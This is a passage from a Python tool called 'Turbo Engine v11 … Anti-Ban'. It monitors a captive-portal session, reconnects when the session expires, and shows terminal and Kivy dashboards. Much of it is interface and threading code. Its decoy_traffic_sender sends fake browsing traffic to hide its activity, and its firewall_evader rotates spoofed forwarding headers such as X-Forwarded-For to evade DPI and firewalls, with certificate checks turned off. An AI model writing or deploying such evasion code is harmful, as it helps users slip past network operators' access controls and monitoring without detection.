                sess = new_session()
            elif r.status_code in (301, 302) or (
                r.status_code == 200
                and r.url != (Engine.link or link)
                and any(kw in r.url.lower() for kw in ("login", "auth", "portal"))
            ):
                Engine.log("Heartbeat: session expired")
                _recon.request("heartbeat: session expired")
            if hb_count % 4 == 0:
                _safe_close(sess)
                sess = new_session()
        except (requests.RequestException, OSError):
            _safe_close(sess)
            sess = new_session()
            if not _net_ok_cached(timeout=2):
                Engine.log("Heartbeat: network down, requesting reconnect")
                _recon.request("heartbeat: network down")
            Engine.stop_ev.wait(random.uniform(3, 8))


# ── Speed tracker ─────────────────────────────────────────────────────
@_safe_thread
def speed_tracker() -> None:
    """Calculate download speed from byte counter."""
    prev_bytes = Engine.bytes_rx
    prev_time  = time.time()
    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(3)
        if Engine.stop_ev.is_set():
            break
        now        = time.time()
        cur_bytes  = Engine.bytes_rx
        elapsed    = now - prev_time
        if elapsed > 0:
            with Engine.lock:
                Engine.dl_speed = (cur_bytes - prev_bytes) / elapsed
        prev_bytes = cur_bytes
        prev_time  = now


# ── Adaptive mode watcher ────────────────────────────────────────────
@_safe_thread
def adaptive_watcher() -> None:
    """Auto-switch mode based on connection quality."""
    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(15 + random.uniform(0, 8))
        if Engine.stop_ev.is_set():
            break
        if not Engine.auto_mode:
            continue
        ping      = Engine.ema_ping
        err_ratio = Engine.errs / max(Engine.hits + Engine.errs, 1)
        old       = Engine.mode
        if err_ratio > 0.2:
            if old != "N":
                Engine.mode = "N"
                Engine.log("Auto -> Normal (high error rate)")
        elif ping < 60 and err_ratio < 0.05 and old != "T":
            Engine.mode = "T"
            Engine.log("Auto -> Thunder")
        elif ping < 150 and err_ratio < 0.10 and old != "G":
            Engine.mode = "G"
            Engine.log("Auto -> Game")
        elif ping >= 250 and old != "N":
            Engine.mode = "N"
            Engine.log("Auto -> Normal (high ping)")


# ── Session cleaner ───────────────────────────────────────────────────
@_safe_thread
def session_cleaner() -> None:
    """Periodically prune excess sessions."""
    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(45)
        if Engine.stop_ev.is_set():
            break
        to_close = []
        with Engine.lock:
            over = len(Engine._sessions) - MAX_SESSIONS
            if over > 0:
                to_close           = Engine._sessions[:over]
                Engine._sessions   = Engine._sessions[over:]
        for s in to_close:
            try:
                s.close()
            except Exception:
                pass
        if to_close:
            Engine.log(f"Cleaned {len(to_close)} old sessions")


# ── Error monitor ─────────────────────────────────────────────────────
@_safe_thread
def error_monitor() -> None:
    """Watch error rate and trigger reconnect when too high."""
    prev_errs = prev_hits = 0
    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(15)
        if Engine.stop_ev.is_set():
            break
        delta_errs = Engine.errs - prev_errs
        delta_hits = Engine.hits - prev_hits
        total      = delta_errs + delta_hits
        if total > 8 and delta_errs / total > 0.5:
            Engine.log(f"High error rate ({delta_errs / total:.0%}), requesting reconnect")
            _recon.request("error_monitor: high error rate")
        elif total > 5 and delta_errs == total:
            Engine.log("All requests failing, requesting reconnect")
            _recon.request("error_monitor: all requests failing")
        prev_errs = Engine.errs
        prev_hits = Engine.hits


# ── Predictive reconnect watcher ──────────────────────────────────────
@_safe_thread
def predictive_reconnect_watcher() -> None:
    """Detect ping spikes / jitter and trigger early reconnection."""
    _baseline_pings = collections.deque(maxlen=10)
    _last_preempt = 0.0

    Engine.log("Predictive-reconnect watcher online")

    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(PREDICT_INTERVAL)
        if Engine.stop_ev.is_set():
            break

        if Engine._paused or not Engine.running:
            continue

        p = Engine.ema_ping
        if p <= 0:
            continue

        _baseline_pings.append(p)
        if len(_baseline_pings) < 3:
            continue

        baseline = sum(_baseline_pings) / len(_baseline_pings)
        jitter = math.sqrt(
            sum((x - baseline) ** 2 for x in _baseline_pings) / len(_baseline_pings)
        )

        spike_ratio   = p / baseline if baseline > 0 else 1.0
        now           = time.time()
        cooldown_ok   = (now - _last_preempt) > REAUTH_COOLDOWN * 2

        triggered = False
        reason    = ""
        if p > PING_SPIKE_ABS and cooldown_ok:
            triggered, reason = True, f"abs spike {p:.0f}ms"
        elif spike_ratio > PING_SPIKE_RATIO and p > 250 and cooldown_ok:
            triggered, reason = True, f"ratio x{spike_ratio:.1f} baseline={baseline:.0f}ms"
        elif jitter > JITTER_THRESHOLD and cooldown_ok:
            triggered, reason = True, f"jitter {jitter:.0f}ms"

        if triggered:
            Engine.log(f"Predictive: early reauth ({reason})")
            _last_preempt = now
            _recon.request(f"predictive: {reason}")
            _baseline_pings.clear()


# ── Decoy traffic sender ─────────────────────────────────────────────
@_safe_thread
def decoy_traffic_sender() -> None:
    """Send innocuous traffic to blend in with normal browsing."""
    Engine.log("Decoy-traffic sender online")
    sess = new_session()
    hit  = 0

    while not Engine.stop_ev.is_set() and Engine.running:
        sleep = DECOY_INTERVAL * random.uniform(0.6, 1.4)
        Engine.stop_ev.wait(sleep)
        if Engine.stop_ev.is_set():
            break

        if Engine._paused or not Engine.running:
            continue

        url = random.choice(_DECOY_URLS)
        try:
            hdrs = _stealth_headers()
            referer_base, _ = random.choice(_REFERER_CHAINS)
            hdrs["Referer"] = referer_base
            sess.get(url, headers=hdrs, timeout=8,
                     verify=False, allow_redirects=False)
            hit += 1
            if hit % 8 == 0:
                _safe_close(sess)
                sess = new_session()
        except Exception:
            _safe_close(sess)
            sess = new_session()


# ── Firewall evader ───────────────────────────────────────────────────
@_safe_thread
def firewall_evader() -> None:
    """Rotate headers and refresh session to evade DPI / firewalls."""
    Engine.log("Firewall evader online")
    _last_refresh = time.time()
    REFRESH_INTERVAL = 90

    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(random.uniform(15, 30))
        if Engine.stop_ev.is_set():
            break

        if Engine._paused or not Engine.running:
            continue

        now = time.time()

        if (now - _last_refresh) > REFRESH_INTERVAL and Engine.link:
            try:
                s = new_session()
                ref_base, _ = random.choice(_REFERER_CHAINS)
                hdrs = _stealth_headers()
                hdrs["Referer"] = ref_base
                time.sleep(random.uniform(0.2, 1.5))
                r = s.get(Engine.link, headers=hdrs, timeout=10,
                          verify=False, allow_redirects=True)
                _last_refresh = now
                if r.status_code in (302, 301) or (
                    r.status_code == 200 and
                    any(kw in r.url.lower() for kw in ("login", "auth", "portal", "captive"))
                ):
                    Engine.log("Evader: session expired, requesting reconnect")
                    _recon.request("firewall_evader: session expired")
                _safe_close(s)
            except Exception as exc:
                Engine.log(f"Evader refresh error: {_sanitize_log(str(exc))}")

        if FIREWALL_EVADE:
            try:
                with Engine.lock:
                    snap = list(Engine._sessions)
                for sess in random.sample(snap, min(3, len(snap))):
                    try:
                        new_hdrs = _stealth_headers()
                        sess.headers.update({
                            k: v for k, v in new_hdrs.items()
                            if k in ("X-Forwarded-For", "X-Real-IP", "Via",
                                     "Forwarded", "X-Client-IP", "Cache-Control",
                                     "X-Originating-IP")
                        })
                    except Exception:
                        pass
            except Exception:
                pass


# ── Connection quality monitor ────────────────────────────────────────
@_safe_thread
def connection_quality_monitor() -> None:
    """Monitor quality and proactively refresh stale sessions."""
    Engine.log("Connection quality monitor online")
    _bad_streak  = 0

    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(10)
        if Engine.stop_ev.is_set():
            break

        if Engine._paused or not Engine.running:
            _bad_streak = 0
            continue

        ping = Engine.ema_ping
        err_ratio = Engine.errs / max(Engine.hits + Engine.errs, 1)

        if ping > 0 and ping < 200 and err_ratio < 0.1:
            _bad_streak = 0
        elif ping > 400 or err_ratio > 0.3:
            _bad_streak += 1
        else:
            _bad_streak = max(0, _bad_streak - 1)

        if _bad_streak >= 3:
            Engine.log("Quality monitor: sustained poor quality, refreshing sessions...")
            _bad_streak = 0
            to_close = []
            with Engine.lock:
                if len(Engine._sessions) > 3:
                    to_close = Engine._sessions[:3]
                    Engine._sessions = Engine._sessions[3:]
            for s in to_close:
                try:
                    s.close()
                except Exception:
                    pass


# ── Engine start / stop ───────────────────────────────────────────────
def engine_start() -> None:
    """Initialize and start all engine subsystems."""
    if not Engine._start_lock.acquire(blocking=False):
        Engine.log("Engine start already in progress")
        return
    try:
        if Engine.running:
            Engine.log("Engine already running")
            return
        Engine.reset()
        Engine.stop_ev.clear()
        Engine.running    = True
        Engine.start_time = time.time()
        Engine.log("Engine v11 starting...")

        if net_ok():
            Engine.log("Already online - monitor mode")
            Engine.sid  = "MONITOR"
            Engine.link = PROBE_URLS[0]
        else:
            retries = 0
            while not Engine.stop_ev.is_set():
                try:
                    sid, link = detect_portal()
                except Exception as exc:
                    Engine.log(f"Portal error: {_sanitize_log(str(exc))}")
                    sid, link = None, None
                if sid:
                    Engine.sid  = sid
                    Engine.link = link
                    break
                retries += 1
                wait = min(3 + retries * 2, 20)
                Engine.log(f"Retry {retries} in {wait}s...")
                Engine.stop_ev.wait(wait)
            if Engine.stop_ev.is_set():
                return

        time.sleep(random.uniform(0.5, 1.5))

        # Start reconnection coordinator
        _recon.start()

        workers = [
            (launch_threads,               (Engine.link, Engine.mode)),
            (watchdog,                      (Engine.link,)),
            (heartbeat,                     (Engine.link,)),
            (speed_tracker,                 ()),
            (adaptive_watcher,              ()),
            (session_cleaner,               ()),
            (error_monitor,                 ()),
            (predictive_reconnect_watcher,  ()),
            (decoy_traffic_sender,          ()),
            (firewall_evader,               ()),
            (connection_quality_monitor,    ()),
        ]
        for fn, args in workers:
            t = threading.Thread(target=fn, args=args, daemon=True)
            t.start()
            with Engine.lock:
                Engine._worker_threads.append(t)
            time.sleep(0.2)

        Engine.log("All systems running")

    except Exception as exc:
        Engine.log(f"Engine error: {_sanitize_log(str(exc))}")
        traceback.print_exc()
        Engine.running = False
    finally:
        Engine._start_lock.release()


def engine_stop() -> None:
    """Gracefully stop the engine and wait for threads to finish."""
    Engine.log("Engine stopping...")
    Engine.running = False
    Engine.stop_ev.set()

    # Stop reconnection coordinator
    _recon.stop()

    # Wait for worker threads (with timeout)
    with Engine.lock:
        threads = Engine._worker_threads[:]
        Engine.thread_count = 0
        Engine.active_threads = 0
    for t in threads:
        try:
            t.join(timeout=3)
        except Exception:
            pass

    Engine._close_sessions()
    Engine._worker_threads.clear()
    Engine.log("Engine stopped")


# ── Terminal UI helpers ───────────────────────────────────────────────
def _term_size() -> tuple:
    try:
        import shutil
        s = shutil.get_terminal_size((60, 24))
        if s.columns > 10:
            return s.columns, s.lines
    except Exception:
        pass
    try:
        if fcntl is not None:
            data = fcntl.ioctl(sys.stdout.fileno(), 0x5413, b"\x00" * 8)
            rows, cols = struct.unpack("HHHH", data)[:2]
            if cols > 10:
                return cols, rows
    except Exception:
        pass
    return 60, 24


def _out(text: str) -> None:
    try:
        sys.stdout.write(text)
        sys.stdout.flush()
    except Exception:
        pass


def _clr() -> None:
    _out("\033[2J\033[H")


def _box_top(w: int, title: str = "") -> str:
    if title:
        t = f" {title} "
        side = (w - len(t) - 2) // 2
        return C["P"] + "+" + "-" * side + t + "-" * (w - side - len(t) - 2) + "+" + C["X"]
    return C["P"] + "+" + "-" * (w - 2) + "+" + C["X"]


def _box_bot(w: int) -> str:
    return C["P"] + "+" + "-" * (w - 2) + "+" + C["X"]


def _box_row(w: int, content: str, raw_len: int = -1) -> str:
    inner  = w - 4
    vlen   = raw_len if raw_len >= 0 else len(content)
    pad    = max(0, inner - vlen)
    return C["P"] + "| " + C["X"] + content + " " * pad + C["P"] + " |" + C["X"]


def _pbar(frac: float, width: int, col: str) -> tuple:
    filled = max(0, int(min(frac, 1.0) * width))
    empty  = width - filled
    bar    = C[col] + "|" * filled + C["Gy"] + "." * empty + C["X"]
    return bar, width


def draw_terminal(sid: str = "------") -> None:
    try:
        W, _H = _term_size()
        W     = max(W, 36)
        inner = W - 4

        ql, _, _   = Engine.quality()
        mode_map   = {"N": ("NORMAL", "C"), "G": ("GAME", "G"),
                      "T": ("THUNDER", "Y"), "A": ("AUTO", "P")}
        mode_s, mc = mode_map.get(Engine.mode, ("NORMAL", "C"))

        pc     = "G" if Engine.ema_ping < 80  else ("Y" if Engine.ema_ping < 200 else "R")
        bpc    = "G" if Engine.best_ping < 80 else "Y"
        qc     = "G" if ql in ("Excellent", "Good") else ("Y" if ql == "Fair" else "Gy")
        gw     = (f"{Engine.gateway_ip}:{Engine.gateway_port}"
                  if Engine.gateway_ip else "---")
        total  = Engine.hits + Engine.errs
        epct   = f"{Engine.errs / total * 100:.0f}%" if total else "0%"
        ec     = ("G" if not total or Engine.errs / total < 0.10 else
                  "Y" if Engine.errs / total < 0.30 else "R")

        status_s   = (f"{C['Y']}[RECONNECTING...]{C['X']}"
                      if Engine._paused else
                      f"{C['G']}[ONLINE]{C['X']}" if Engine.running else
                      f"{C['R']}[STOPPED]{C['X']}")
        status_vl  = (16 if Engine._paused else 8 if Engine.running else 9)
        sid_s      = f"...{sid[-8:]}" if len(sid) > 8 else sid

        bar_w      = inner - 2
        bar_frac   = max(0.0, 1.0 - Engine.ema_ping / 500.0)
        pbar, pbl  = _pbar(bar_frac, bar_w, pc)

        fw_status  = f"{C['G']}ON{C['X']}" if FIREWALL_EVADE else f"{C['R']}OFF{C['X']}"
        fw_vl      = 2

        def R(left_label, lc, left_val, lv_len,
              right_label="", rc="", right_val="", rv_len=0):
            half   = inner // 2
            ls     = f"{C[lc]}{left_label}{C['X']}  {C[lc]}{left_val}{C['X']}"
            l_vis  = len(left_label) + 2 + lv_len
            if right_label:
                pad    = max(1, half - l_vis)
                rs     = f"{C[rc]}{right_label}{C['X']}  {C[rc]}{right_val}{C['X']}"
                r_vis  = len(right_label) + 2 + rv_len
                content = ls + " " * pad + rs
                c_vis   = l_vis + pad + r_vis
            else:
                content, c_vis = ls, l_vis
            return _box_row(W, content, c_vis)

        with Engine.lock:
            logs = list(Engine.log_lines)[-6:]

        out_parts = [
            "\033[H",
            _box_top(W, "TURBO ENGINE v11"),
            "\n",
            _box_row(W,
                     f"{C[mc]}{mode_s:<8}{C['X']}  {status_s}",
                     8 + 2 + status_vl),
            "\n",
            _box_row(W,
                     f"{C['Y']}Uptime{C['X']}  {C['Y']}{Engine.uptime()}{C['X']}   "
                     f"{C['W']}Thr{C['X']}  {C['W']}{Engine.active_threads}/{Engine.thread_count}{C['X']}   "
                     f"{C['Gy']}FW{C['X']}  {fw_status}",
                     6 + 2 + 8 + 3 + 3 + 2 + 5 + 3 + 2 + 2 + fw_vl),
            "\n",
            _box_row(W,
                     f"{C['Gy']}SID{C['X']}  {C['C']}{sid_s}{C['X']}   "
                     f"{C['Gy']}GW{C['X']}  {C['Gy']}{gw}{C['X']}",
                     3 + 2 + len(sid_s) + 3 + 2 + 2 + len(gw)),
            "\n",
            C["P"] + "+" + "-" * (W - 2) + "+" + C["X"],
            "\n",
            R("Ping", pc, f"{Engine.ema_ping:.0f} ms", len(f"{Engine.ema_ping:.0f} ms"),
              "Best", bpc, f"{Engine.best_ping:.0f} ms", len(f"{Engine.best_ping:.0f} ms")),
            "\n",
            _box_row(W, pbar, pbl),
            "\n",
            R("Quality", qc, ql, len(ql),
              "Speed",  "Y", fmt_bytes(Engine.dl_speed) + "/s",
              len(fmt_bytes(Engine.dl_speed)) + 2),
            "\n",
            C["P"] + "+" + "-" * (W - 2) + "+" + C["X"],
            "\n",
            R("Hits",  "G", str(Engine.hits), len(str(Engine.hits)),
              "Errs",  ec,  f"{Engine.errs} ({epct})", len(str(Engine.errs)) + len(epct) + 3),
            "\n",
            R("Recon", "Y", str(Engine.reconnects), len(str(Engine.reconnects)),
              "Reauth","C", str(Engine.reauths), len(str(Engine.reauths))),
            "\n",
            R("Data",  "W", fmt_bytes(Engine.bytes_rx), len(fmt_bytes(Engine.bytes_rx)),
              "Decoy", "Gy", "Active" if FIREWALL_EVADE else "Off", 6 if FIREWALL_EVADE else 3),
            "\n",
            C["P"] + "+" + "-" * (W - 2) + "+" + C["X"],
            "\n",
            _box_row(W,
                     f"{C['W']}[1]{C['X']}Normal  "
                     f"{C['G']}[2]{C['X']}Game  "
                     f"{C['Y']}[3]{C['X']}Thunder  "
                     f"{C['P']}[4]{C['X']}Auto  "
                     f"{C['R']}[Q]{C['X']}Quit",
                     38),
            "\n",
            _box_bot(W),
            "\n",
        ]

        _out("".join(out_parts))

        for entry in logs:
            ts   = entry[:10] if len(entry) > 10 else entry
            body = entry[10:] if len(entry) > 10 else ""
            _out(f" {C['Gy']}{ts}{C['X']}{body}\n")

    except Exception:
        pass


def _read_key_nonblock() -> str:
    import select as _sel
    try:
        ready, _, _ = _sel.select([sys.stdin], [], [], 0.1)
        if ready:
            ch = sys.stdin.read(1)
            return ch if ch else ""
    except Exception:
        pass
    return ""


def terminal_refresher(sid: str) -> None:
    _clr()
    while not Engine.stop_ev.is_set():
        try:
            live = Engine.sid if Engine.sid and Engine.sid != "MONITOR" else sid
            draw_terminal(live)
        except Exception:
            pass
        Engine.stop_ev.wait(1.2)


def terminal_input(link: str, sid: str) -> None:
    _MODES = {"1": ("N", "Normal"), "2": ("G", "Game"),
              "3": ("T", "Thunder"), "4": ("A", "Auto")}

    def apply_key(k):
        entry = _MODES.get(k)
        if entry:
            Engine.mode, label = entry
            Engine.auto_mode   = Engine.mode == "A"
            Engine.log(f"Mode: {label}")
            return True
        return False

    try:
        import select  # noqa: F401 — check availability

        _raw_ok = False
        try:
            import tty, termios as _tm
            _fd  = sys.stdin.fileno()
            _old = _tm.tcgetattr(_fd)
            tty.setcbreak(_fd)
            _raw_ok = True
        except Exception:
            pass

        try:
            while not Engine.stop_ev.is_set():
                k = _read_key_nonblock()
                if not k:
                    continue
                k = k.lower()
                if not apply_key(k) and k in ("q", "\x03", "\x04"):
                    Engine.stop_ev.set()
                    break
        finally:
            if _raw_ok:
                try:
                    _tm.tcsetattr(_fd, _tm.TCSADRAIN, _old)
                except Exception:
                    pass

    except Exception:
        while not Engine.stop_ev.is_set():
            try:
                k = input().strip().lower()
                if not apply_key(k) and k in ("q", "quit"):
                    Engine.stop_ev.set()
                    break
            except (EOFError, KeyboardInterrupt):
                Engine.stop_ev.set()
                break


def run_terminal() -> None:
    if not REQUESTS_OK:
        print(f"{C['R']}  pip install requests urllib3{C['X']}")
        return

    W, _ = _term_size()
    W    = max(W, 36)
    _clr()

    lines = [
        C["P"] + "+" + "=" * (W - 2) + "+" + C["X"],
        C["P"] + "| " + C["X"] + f"{C['P']}TURBO ENGINE{C['X']} {C['C']}v11 ULTRA-STABLE{C['X']}".center(W - 4) + C["P"] + " |" + C["X"],
        C["P"] + "+" + "-" * (W - 2) + "+" + C["X"],
        C["P"] + "| " + C["X"] + f"  {C['W']}1{C['X']}  {C['C']}Normal   {C['Gy']}Stable & safe{C['X']}".ljust(W - 4) + C["P"] + " |" + C["X"],
        C["P"] + "| " + C["X"] + f"  {C['W']}2{C['X']}  {C['G']}Game     {C['Gy']}Low latency{C['X']}".ljust(W - 4) + C["P"] + " |" + C["X"],
        C["P"] + "| " + C["X"] + f"  {C['W']}3{C['X']}  {C['Y']}Thunder  {C['Gy']}Max speed{C['X']}".ljust(W - 4) + C["P"] + " |" + C["X"],
        C["P"] + "| " + C["X"] + f"  {C['W']}4{C['X']}  {C['P']}Auto     {C['Gy']}Smart adaptive{C['X']}".ljust(W - 4) + C["P"] + " |" + C["X"],
        C["P"] + "+" + "=" * (W - 2) + "+" + C["X"],
    ]
    _out("\n".join(lines) + "\n")
    _out(f"\n  {C['W']}Select mode (1-4, default=1): {C['X']}")

    chosen = [None]

    def _ask():
        try:
            chosen[0] = input().strip()
        except (EOFError, KeyboardInterrupt):
            pass

    t = threading.Thread(target=_ask, daemon=True)
    t.start()
    t.join(10)

    mode_map = {"1": "N", "2": "G", "3": "T", "4": "A"}
    Engine.mode      = mode_map.get(chosen[0], "N")
    Engine.auto_mode = Engine.mode == "A"

    threading.Thread(target=engine_start, daemon=True).start()
    time.sleep(2.5)

    sid = Engine.sid or "------"
    threading.Thread(target=terminal_refresher, args=(sid,), daemon=True).start()
    threading.Thread(target=terminal_input,     args=(Engine.link, sid), daemon=True).start()

    try:
        while not Engine.stop_ev.is_set():
            Engine.stop_ev.wait(1)
    except KeyboardInterrupt:
        Engine.stop_ev.set()

    engine_stop()
    print(f"\n  {C['R']}Stopped.{C['X']}  Uptime: {C['Y']}{Engine.uptime()}{C['X']}\n")


# ── Kivy GUI ──────────────────────────────────────────────────────────
def run_kivy() -> None:
    from kivy.app import App
    from kivy.clock import Clock
    from kivy.core.window import Window
    from kivy.graphics import Color, RoundedRectangle, Line, Ellipse
    from kivy.metrics import dp, sp
    from kivy.uix.boxlayout import BoxLayout
    from kivy.uix.button import Button
    from kivy.uix.gridlayout import GridLayout
    from kivy.uix.label import Label
    from kivy.uix.scrollview import ScrollView
    from kivy.uix.widget import Widget
    from kivy.utils import get_color_from_hex

    Window.clearcolor = get_color_from_hex("#0d0d1a")

    def clr(h):
        return get_color_from_hex(h)

    class Card(BoxLayout):
        def __init__(self, bg="#161630", radius=18, border=None, **kw):
            super().__init__(**kw)
            with self.canvas.before:
                Color(*clr(bg))
                self._rect = RoundedRectangle(pos=self.pos, size=self.size,
                                              radius=[dp(radius)])
                if border:
                    Color(*clr(border))
                    self._line = Line(
                        rounded_rectangle=(self.x, self.y, self.width,
                                           self.height, dp(radius)), width=1.2)
            self._r = radius
            self._border = border
            self.bind(pos=self._sync, size=self._sync)

        def _sync(self, *_):
            self._rect.pos  = self.pos
            self._rect.size = self.size
            if self._border:
                self._line.rounded_rectangle = (
                    self.x, self.y, self.width, self.height, dp(self._r))

    class Pill(BoxLayout):
        def __init__(self, text="", color="#00e676", **kw):
            kw.setdefault("size_hint", (None, None))
            kw.setdefault("size", (dp(110), dp(30)))
            super().__init__(**kw)
            with self.canvas.before:
                self._c = Color(*clr(color + "33"))
                self._bg = RoundedRectangle(pos=self.pos, size=self.size,
                                            radius=[dp(15)])
                self._bc = Color(*clr(color))
                self._bd = Line(rounded_rectangle=(self.x, self.y,
                                                   self.width, self.height, dp(15)),
                                width=1.4)
            self.bind(pos=self._sync, size=self._sync)
            self.lbl = Label(text=text, bold=True, font_size=sp(11),
                             color=clr(color))
            self.add_widget(self.lbl)

        def _sync(self, *_):
            self._bg.pos  = self.pos
            self._bg.size = self.size
            self._bd.rounded_rectangle = (self.x, self.y,
                                          self.width, self.height, dp(15))

        def update(self, text, color):
            try:
                self.lbl.text       = text
                self.lbl.color      = clr(color)
                self._c.rgba        = clr(color + "33")
                self._bc.rgba       = clr(color)
            except Exception:
                pass

    class StatusDot(Widget):
        def __init__(self, **kw):
            kw.setdefault("size_hint", (None, None))
            kw.setdefault("size", (dp(14), dp(14)))
            super().__init__(**kw)
            with self.canvas:
                self._c  = Color(*clr("#00e676"))
                self._dot = Ellipse(pos=self.pos, size=self.size)
            self.bind(pos=self._sync, size=self._sync)

        def _sync(self, *_):
            self._dot.pos  = self.pos
            self._dot.size = self.size

        def set_color(self, color):
            try:
                self._c.rgba = clr(color)
            except Exception:
                pass

    class StatBar(Widget):
        def __init__(self, **kw):
            kw.setdefault("size_hint_y", None)
            kw.setdefault("height", dp(8))
            super().__init__(**kw)
            with self.canvas:
                Color(*clr("#1e1e3a"))
                self._bg  = RoundedRectangle(pos=self.pos, size=self.size,
                                             radius=[dp(4)])
                self._fc  = Color(*clr("#00e676"))
                self._bar = RoundedRectangle(pos=self.pos,
                                             size=(0, self.height),
                                             radius=[dp(4)])
            self.bind(pos=self._sync, size=self._sync)
            self._frac = 0.0

        def _sync(self, *_):
            self._bg.pos  = self.pos
            self._bg.size = self.size
            self._bar.pos = self.pos
            self._bar.size = (self.width * self._frac, self.height)

        def set(self, frac, color="#00e676"):
            self._frac = max(0.0, min(1.0, frac))
            self._bar.size = (self.width * self._frac, self.height)
            self._fc.rgba  = clr(color)

    class StatCard(Card):
        def __init__(self, icon, title, **kw):
            kw.setdefault("orientation", "vertical")
            kw.setdefault("size_hint_y", None)
            kw.setdefault("height", dp(64))
            kw.setdefault("padding", (dp(12), dp(8)))
            kw.setdefault("spacing", dp(2))
            super().__init__(bg="#12122a", radius=14, **kw)
            top = BoxLayout(orientation="horizontal", size_hint_y=None,
                            height=dp(18))
            top.add_widget(Label(text=f"{icon}  {title}", font_size=sp(10),
                                 color=clr("#666688"), halign="left",
                                 size_hint_x=1))
            self.add_widget(top)
            self._val = Label(text="--", font_size=sp(18), bold=True,
                              color=clr("#f0f0f0"), halign="left",
                              size_hint_y=None, height=dp(28))
            self._val.bind(size=self._val.setter("text_size"))
            self.add_widget(self._val)

        def set(self, value, color="#f0f0f0"):
            try:
                self._val.text  = str(value)
                self._val.color = clr(color)
            except Exception:
                pass

    def make_chip(text, accent, code, on_press_cb):
        btn = Button(
            text=text, bold=True, font_size=sp(12),
            background_normal="", background_color=clr("#1a1a38"),
            color=clr(accent), size_hint_y=None, height=dp(42))
        btn._accent = accent
        btn._code   = code
        btn.bind(on_press=lambda b: on_press_cb(b))
        return btn

    class TurboApp(App):
        def build(self):
            self.title = "Turbo Engine v11"
            self._chips = {}

            sv   = ScrollView(do_scroll_x=False, bar_width=0)
            root = BoxLayout(orientation="vertical",
                             padding=(dp(12), dp(16), dp(12), dp(12)),
                             spacing=dp(10), size_hint_y=None)
            root.bind(minimum_height=root.setter("height"))
            sv.add_widget(root)

            topbar = BoxLayout(orientation="horizontal",
                               size_hint_y=None, height=dp(50))
            title_col = BoxLayout(orientation="vertical")
            title_col.add_widget(
                Label(text="Turbo Engine", font_size=sp(20), bold=True,
                      color=clr("#bb86fc"), halign="left",
                      size_hint_y=None, height=dp(28)))
            title_col.add_widget(
                Label(text="v11  |  Ultra-Stable  |  Anti-Ban", font_size=sp(10),
                      color=clr("#444466"), halign="left",
                      size_hint_y=None, height=dp(18)))
            topbar.add_widget(title_col)
            topbar.add_widget(Widget())

            self._pill = Pill(text="STARTING", color="#ffd740")
            topbar.add_widget(self._pill)
            root.add_widget(topbar)

            status_card = Card(bg="#0f0f28", radius=20,
                               border="#2a2a5a",
                               orientation="vertical",
                               size_hint_y=None, height=dp(130),
                               padding=(dp(16), dp(14)),
                               spacing=dp(6))

            s_top = BoxLayout(orientation="horizontal",
                              size_hint_y=None, height=dp(36))
            self._dot = StatusDot()
            s_top.add_widget(self._dot)
            s_top.add_widget(Widget(size_hint_x=None, width=dp(10)))
            self._status_lbl = Label(
                text="Connecting...", font_size=sp(18), bold=True,
                color=clr("#ffd740"), halign="left")
            self._status_lbl.bind(size=self._status_lbl.setter("text_size"))
            s_top.add_widget(self._status_lbl)
            s_top.add_widget(Widget())
            self._uptime_lbl = Label(
                text="00:00:00", font_size=sp(12),
                color=clr("#444466"), halign="right",
                size_hint_x=None, width=dp(70))
            s_top.add_widget(self._uptime_lbl)
            status_card.add_widget(s_top)

            self._stat_bar = StatBar()
            status_card.add_widget(self._stat_bar)

            s_bot = BoxLayout(orientation="horizontal",
                              size_hint_y=None, height=dp(28),
                              spacing=dp(12))
            self._ping_lbl    = Label(text="Ping: -- ms", font_size=sp(11),
                                      color=clr("#666688"))
            self._quality_lbl = Label(text="Quality: --", font_size=sp(11),
                                      color=clr("#666688"))
            self._speed_lbl   = Label(text="Speed: --", font_size=sp(11),
                                      color=clr("#666688"))
            for w in (self._ping_lbl, self._quality_lbl, self._speed_lbl):
                s_bot.add_widget(w)
            status_card.add_widget(s_bot)
            root.add_widget(status_card)

            grid = GridLayout(cols=2, size_hint_y=None,
                              height=dp(144), spacing=dp(8))
            self._sc_hits  = StatCard(">>", "Hits")
            self._sc_errs  = StatCard("!!", "Errors")
            self._sc_recon = StatCard("<>", "Reconnects")
            self._sc_reauth= StatCard("**", "Re-auths")
            for sc in (self._sc_hits, self._sc_errs,
                       self._sc_recon, self._sc_reauth):
                grid.add_widget(sc)
            root.add_widget(grid)

            mode_card = Card(bg="#12122a", radius=16,
                             orientation="vertical",
                             size_hint_y=None, height=dp(100),
                             padding=(dp(12), dp(10)),
                             spacing=dp(8))
            mode_card.add_widget(
                Label(text="MODE", font_size=sp(10), bold=True,
                      color=clr("#444466"), halign="left",
                      size_hint_y=None, height=dp(16)))
            chips_row = GridLayout(cols=4, size_hint_y=None,
                                   height=dp(44), spacing=dp(6))
            modes = [("Normal", "#40c4ff", "N"), ("Game",    "#00e676", "G"),
                     ("Thunder","#ffd740",  "T"), ("Auto",    "#bb86fc", "A")]
            for label, acc, code in modes:
                chip = make_chip(label, acc, code, self._on_chip)
                self._chips[code] = (chip, acc)
                chips_row.add_widget(chip)
            mode_card.add_widget(chips_row)
            root.add_widget(mode_card)
            self._highlight_chip("N")

            act_card = Card(bg="#12122a", radius=16,
                            orientation="vertical",
                            size_hint_y=None, height=dp(108),
                            padding=(dp(12), dp(10)),
                            spacing=dp(8))
            act_card.add_widget(
                Label(text="CONTROLS", font_size=sp(10), bold=True,
                      color=clr("#444466"), halign="left",
                      size_hint_y=None, height=dp(16)))
            act_row = BoxLayout(orientation="horizontal",
                                size_hint_y=None, height=dp(50),
                                spacing=dp(8))

            self._stop_btn = Button(
                text="STOP", bold=True, font_size=sp(13),
                background_normal="", background_color=clr("#2a0a0a"),
                color=clr("#ff5252"), size_hint_y=None, height=dp(50))
            self._stop_btn.bind(on_press=self._on_stop)

            recon_btn = Button(
                text="RECONNECT", bold=True, font_size=sp(12),
                background_normal="", background_color=clr("#1a1a38"),
                color=clr("#ffab40"), size_hint_y=None, height=dp(50))
            recon_btn.bind(on_press=self._on_recon)

            log_btn = Button(
                text="CLEAR LOG", bold=True, font_size=sp(12),
                background_normal="", background_color=clr("#1a1a38"),
                color=clr("#666688"), size_hint_y=None, height=dp(50))
